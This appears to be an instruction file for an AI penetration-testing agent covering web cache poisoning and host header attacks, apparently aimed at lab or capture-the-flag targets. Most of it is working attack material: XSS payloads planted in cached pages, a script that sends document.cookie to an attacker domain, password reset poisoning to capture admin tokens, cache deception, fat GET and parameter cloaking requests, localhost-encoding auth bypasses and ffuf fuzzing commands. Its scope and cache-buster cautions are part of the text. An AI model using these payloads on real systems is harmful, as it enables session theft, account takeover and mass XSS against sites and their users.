---
name: cache-poisoning
description: Web Cache Poisoning and Host Header Attacks — unkeyed parameter/header discovery, cache poisoning via XSS delivery, password reset poisoning, cache deception, fat GET, parameter cloaking, and host header override attacks. Use when HauntMode flags caching/host-header as APPLIES/MAYBE, when responses include X-Cache/CF-Cache-Status/Age headers, or when you need an end-to-end cache attack methodology.
---

# Cache Poisoning & Host Header Attacks

This skill covers detection of unkeyed parameters, cache poisoning methodology, password reset link poisoning, cache deception, fat GET, parameter cloaking, and host header override attacks. Read top to bottom on first use.

---

## 1. Triggers — when this skill applies

- Responses contain `X-Cache`, `X-Cache-Status`, `CF-Cache-Status`, `Age`, `Via`, or `X-Varnish` headers — a caching layer is present
- App constructs absolute URLs from the `Host` header (visible in HTML source: `action="https://HOST/...`, `src="https://HOST/...`)
- Password reset functionality exists (link constructed server-side)
- Any reflected XSS exists even if only in a GET parameter
- Override headers (`X-Forwarded-Host`, `X-Host`, etc.) are reflected in response content
- Target uses a CDN (Cloudflare, Akamai, Fastly, CloudFront)
- URL parameters exist that appear in the response but may not affect the cache key

---

---

## 3. 30-second triage

**Step 1 — Is caching present?**

Look at response headers for any of: `X-Cache: HIT/MISS`, `CF-Cache-Status: HIT`, `Age: <number>`, `X-Varnish`, `Via: varnish`. If any are present, caching is in play.

Force a cache miss to get a fresh response: add `Cache-Control: no-cache` header to your request (most caches respect this by default). If it doesn't work, try `Pragma: no-cache`.

**Step 2 — Does the Host header reflect in the response?**

Send:
```
GET / HTTP/1.1
Host: zzztest.doesnotexist
```

If the response HTML contains `zzztest.doesnotexist` in any URL, the app constructs absolute links from the Host header → vulnerable to password reset poisoning and cache poisoning via override headers.

**Step 3 — Do override headers reflect?**

```
GET / HTTP/1.1
Host: TARGET
X-Forwarded-Host: zzztest.doesnotexist
```

If `zzztest.doesnotexist` appears in response while Host stays as TARGET → `X-Forwarded-Host` is unkeyed and reflected. Prime candidate for cache poisoning.

---

## 4. Cache detection and keying analysis

### 4.1 Reading cache status headers

| Header | Meaning |
|---|---|
| `X-Cache: HIT` | Served from cache |
| `X-Cache: MISS` | Fetched from origin, may now be cached |
| `CF-Cache-Status: HIT` | Cloudflare cached |
| `Age: N` | Response has been cached for N seconds |
| `X-Cache-Status: HIT/MISS` | Custom cache implementation |

If none are present, try: send the same request twice and compare response times — significantly faster on second request suggests caching.

### 4.2 Identifying unkeyed parameters (manual)

Test each GET parameter individually:

1. Send `GET /page?param=UNIQUEVALUE1` — should be a cache MISS
2. Send same request again — should be a cache HIT
3. Send `GET /page?param=UNIQUEVALUE2` — if this is ALSO a HIT (same cache as step 1), the parameter is UNKEYED
4. If step 3 is a MISS, the parameter is keyed (changes cache key)

Always use a unique value nobody else would send (use `uniquevaluexyz123abc` style) to avoid hitting an existing cached entry.

**Always use cache busters** — append a unique keyed parameter to prevent poisoning real users during testing. Example: `?language=de&cb=zzztest001` where `language=de` is the real parameter you're testing against. Change `cb` value each request.

### 4.3 Unkeyed headers to test

Try each header one at a time and check if value appears in response or if cache behavior changes:

```
X-Forwarded-Host: zzztest.doesnotexist
X-HTTP-Host-Override: zzztest.doesnotexist
Forwarded: host=zzztest.doesnotexist
X-Host: zzztest.doesnotexist
X-Forwarded-Server: zzztest.doesnotexist
X-Original-URL: /zzztest
X-Rewrite-URL: /zzztest
X-Backend-Server: zzztest.doesnotexist
```

If any header value appears in the response (in HTML source, JS imports, form actions, etc.) AND the header is not part of the cache key → unkeyed header found.

**Tool (run by you):**
```
[RUN THIS]
python3 /opt/param-miner/param-miner.py --url https://TARGET --burp-proxy http://127.0.0.1:8080
```

Or with Burp's Param Miner extension (if installed): right-click request → Extensions → Param Miner → Guess headers/params. This automates unkeyed header/param discovery.

---

## 5. Exploitation

### 5.1 Cache poisoning via unkeyed GET parameter (reflected XSS delivery)

Precondition: parameter is unkeyed AND reflects in HTML without encoding.

```
GET /index.php?language=de&ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script> HTTP/1.1
Host: TARGET
```

Send twice. Confirm second response is a cache HIT and contains the injected payload.

Now any user requesting `/index.php?language=de` will receive the poisoned response with your XSS payload.

Adapt `language=de` to whatever keyed parameter the intended victims use (identify from JS/cookies in their browser — use the value real users would use).

### 5.2 Cache poisoning via unkeyed header (X-Forwarded-Host → JS import)

Precondition: app loads a JS file using an absolute URL constructed from `X-Forwarded-Host`.

Step 1 — Host your malicious script:
```
# On attacker server, host /debug/js/debug.js containing:
fetch('YOUR_EZXSS_DOMAIN/cache-poison?c='+btoa(document.cookie));
```

Step 2 — Poison the cache:
```
GET /index.php?language=de&cb=zzzpoc1 HTTP/1.1
Host: TARGET
X-Forwarded-Host: ATTACKER_DOMAIN
```

Send twice (confirm cache HIT on second). Drop cache buster for real poison:
```
GET /index.php?language=de HTTP/1.1
Host: TARGET
X-Forwarded-Host: ATTACKER_DOMAIN
```

All users visiting `/index.php?language=de` will load your malicious JS.

### 5.3 Password reset link poisoning

Precondition: app uses Host header (or an override header) to construct the password reset link URL.

**Method 1 — Direct Host header manipulation:**
```
POST /reset.php HTTP/1.1
Host: ATTACKER_DOMAIN
Content-Type: application/x-www-form-urlencoded

username=admin@target.com&Submit=Login
```

If this works, the reset email goes to admin@target.com with a link to `http://ATTACKER_DOMAIN/pw_reset.php?token=...`. When admin clicks, you see the token.

**Method 2 — Override header (when Host is validated):**
```
POST /reset.php HTTP/1.1
Host: TARGET
X-Forwarded-Host: YOUR_EZXSS_DOMAIN
Content-Type: application/x-www-form-urlencoded

username=admin@target.com&Submit=Login
```

Try all override headers: `X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded`, `X-Host`, `X-Forwarded-Server`.

When the admin clicks the poisoned link, ezXSS dashboard at `YOUR_EZXSS_DOMAIN` will log the token in the URL path. Use the token at `/pw_reset.php?token=STOLEN_TOKEN` to reset the admin's password.

**Observation:** Some apps append port numbers. If `X-Forwarded-Host: YOUR_EZXSS_DOMAIN:PORT` breaks the link, try without the port.

### 5.4 Cache deception

Different from cache poisoning. Trick the cache into storing an authenticated response and serving it to unauthenticated users.

Method: append a static-looking extension or path to an authenticated endpoint that the cache will store as a static file:

```
GET /profile.php/nonexistent.css HTTP/1.1
Host: TARGET
Cookie: session=VICTIM_SESSION
```

If the app ignores the suffix and returns the authenticated profile page, and the cache stores it as a `.css` file (because it looks static), any user requesting `/profile.php/nonexistent.css` will receive the cached authenticated response.

To test: visit the URL in a private browsing window (no cookie) — if you see the victim's profile, cache deception works.

### 5.5 Fat GET cache poisoning

Precondition: web server parses parameters from GET request bodies (non-standard), but cache only keys on URL.

Step 1 — Confirm fat GET works:
```
GET /index.php?language=en HTTP/1.1
Host: TARGET
Content-Length: 11

language=de
```

If response is in German (body param overrides URL param), fat GET is supported.

Step 2 — Poison with XSS payload via body:
```
GET /index.php?language=de HTTP/1.1
Host: TARGET
Content-Length: 142

ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

The cache stores the response for `language=de` (URL). All victims requesting that URL get the poisoned response with the XSS payload from the fat GET body parameter.

### 5.6 Parameter cloaking

Precondition: web framework (e.g. Python Bottle) treats `;` as a parameter separator, but the cache does not.

The cache sees: `?language=en&a=b;language=de` → two params: `language=en`, `a=b;language=de`
The backend sees: three params → `language=de` (last wins)

Hide your XSS payload in an unkeyed parameter using semicolon cloaking:
```
GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr%3Dnew%20XMLHttpRequest()%3Bxhr.open('GET'%2C'/admin%3Freveal_flag%3D1'%2Ctrue)%3Bxhr.withCredentials%3Dtrue%3Bxhr.send()%3B%3C/script%3E HTTP/1.1
Host: TARGET
```

Note: semicolons within the XSS payload must be URL-encoded as `%3b` to prevent the backend from treating them as additional separators.

### 5.7 Authentication bypass via Host header

Some apps check if the request came from localhost by examining the Host header:

```
GET /admin.php HTTP/1.1
Host: localhost
```

If the app grants admin access to requests with `Host: localhost` → direct Host header auth bypass.

If the Host header is validated (only accepts real IPs), try override headers:
```
GET /admin.php HTTP/1.1
Host: TARGET
X-Forwarded-Host: localhost
```

Localhost IP encodings to bypass blacklists:

| Encoding | Value |
|---|---|
| Decimal | `2130706433` |
| Hex | `0x7f000001` |
| Octal | `0177.0000.0000.0001` |
| Short | `127.1` |
| IPv6 | `::1` |
| IPv4-in-IPv6 | `[0:0:0:0:0:ffff:127.0.0.1]` |
| External DNS | `localtest.me` |

**Fuzzing with ffuf (user runs this):**
```
[RUN THIS]
# Generate IP list for 192.168.x.x range
for a in {1..255}; do for b in {1..255}; do echo "192.168.$a.$b" >> /tmp/ips.txt; done; done

# Fuzz Host header
ffuf -u http://TARGET/admin.php -w /tmp/ips.txt -H 'Host: FUZZ' -fs BASELINE_SIZE

# Fuzz override headers with localhost bypass payloads
echo -e "X-Forwarded-Host\nX-HTTP-Host-Override\nForwarded\nX-Host\nX-Forwarded-Server" > /tmp/overrides.txt
ffuf -w /tmp/overrides.txt -u http://TARGET/admin.php -H "FUZZ: 127.1" -fs BASELINE_SIZE
```

**Bypass flawed validation:**
- If app validates Host by checking if it ends with `target.com`: register `attackertarget.com` — it passes the suffix check
- If app validates Host but ignores port: try `Host: TARGET:1337` — the port change may bypass the check

---

## 6. Automated scanning

```
[RUN THIS]
# Install if not present: go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
wcvs -u https://TARGET/ -sp language=en -gr
```

This generates a JSON report of detected cache vulnerabilities including unkeyed parameters.

---

## 7. False-positive checks

- **Cache HIT without poisoning** — make sure you're actually receiving a poisoned response, not just an existing cached entry. Use cache busters and `Cache-Control: no-cache` to get fresh responses during discovery.
- **Header reflected but keyed** — if changing `X-Forwarded-Host` causes a cache MISS each time, the header is keyed. Not useful for poisoning.
- **Override header reflected but not in cache key and response varies per user** — if the response has `Vary: X-Forwarded-Host`, the header IS part of the effective cache key. Not exploitable.
- **Password reset link uses HMAC/signed URL** — poisoning the host gets the victim to your domain, but if the token is validated against the original host domain, the token won't work on your server. The token still has value as long as the victim's browser follows the redirect.
- **Admin bypass via Host localhost** — confirm it actually grants elevated access by checking response content, not just status code.

---

## 8. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Cache poison → stored XSS for all users | `xss` | Turns reflected XSS into stored XSS affecting everyone |
| Password reset poisoning → ATO | `auth-bypass` | Account takeover of any user who resets password |
| Host header → cache poison → credential harvest | `xss` | Login form action poisoned → phish credentials of all users |
| Cache deception → leak authenticated data | `idor` | Unauthenticated access to victim profile/API response |
| Fat GET + parameter cloaking → cache poison | `xss` | Bypass keyed parameters to poison cache |
| CRLF → response splitting + cache | `crlf` | Inject headers into cached response |
| Host header auth bypass → admin RCE | `cmdi`, `sqli` | Access admin panel → further exploitation |

---

## 9. Reporting template

```
POTENTIAL FINDING: <Web Cache Poisoning | Password Reset Poisoning | Cache Deception | Host Header Auth Bypass>
Target: <full URL>
Attack vector: <Unkeyed GET param | Unkeyed header | Host header | Fat GET | Parameter cloaking | Cache deception>
Parameter/header: <name>
Evidence:
    Discovery: <param/header is unkeyed — changing it doesn't change cache key, confirmed via X-Cache: HIT>
    Poisoning: <second request with payload confirmed as HIT, payload present in cached response>
    Victim impact: <sent clean request without our param/header, received poisoned response>
Working request:
    <exact poisoning request>
Impact:
    <e.g. "XSS payload delivered to all users visiting /index.php?language=de" or
     "Password reset link for admin poisoned to send token to attacker domain" or
     "Authenticated profile page cached and served to unauthenticated users">
Chain potential: <escalation chains>
Next step: <e.g. "Develop XSS payload that exfils admin cookies via cached response",
            "Trigger password reset for admin@target.com and wait for token callback">
```

---

## 10. Recon tracker vector strings

**Only log if explicitly authorized.**

- `cache:unkeyed-param:<param>` — unkeyed GET parameter confirmed
- `cache:unkeyed-header:<header>` — unkeyed HTTP header confirmed
- `cache:poisoned-xss:<param>:<path>` — cache successfully poisoned with XSS
- `cache:password-reset-poisoning` — reset link poisoned via host header
- `cache:deception:<path>` — authenticated page cached via static-looking suffix
- `cache:host-bypass:<method>` — admin access via Host header manipulation
- `cache:fat-get:<param>` — fat GET parameter bypasses cache keying
- `cache:param-cloaking:<param>` — semicolon cloaking worked
- `cache:no:<path>` — tested, no exploitable misconfiguration found

---

## 11. What NOT to do

- **Do not poison a real production cache without cache busters** — poisoning the actual cache key that real users use will serve your XSS payload to real visitors. Always test with a cache buster (unique keyed param value) until you're ready to actually poison.
- **Do not poison indefinitely** — cached responses have a TTL. If you accidentally poison without a cache buster, the effect will expire. But do not repeatedly re-poison on production — it affects real users.
- **Do not trigger password reset on real admin accounts during initial testing** — wait until you've confirmed the poisoning mechanism works before using it against a real account.
- **Do not test out-of-scope domains** — check `scope.txt`.
- **Do not auto-log to recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not use Burp Active Scanner** — Community edition only; all testing is manual.
- **Do not skip cache buster cleanup** — after confirming a vulnerability, note which cached paths were poisoned so they can be reported and cleaned.
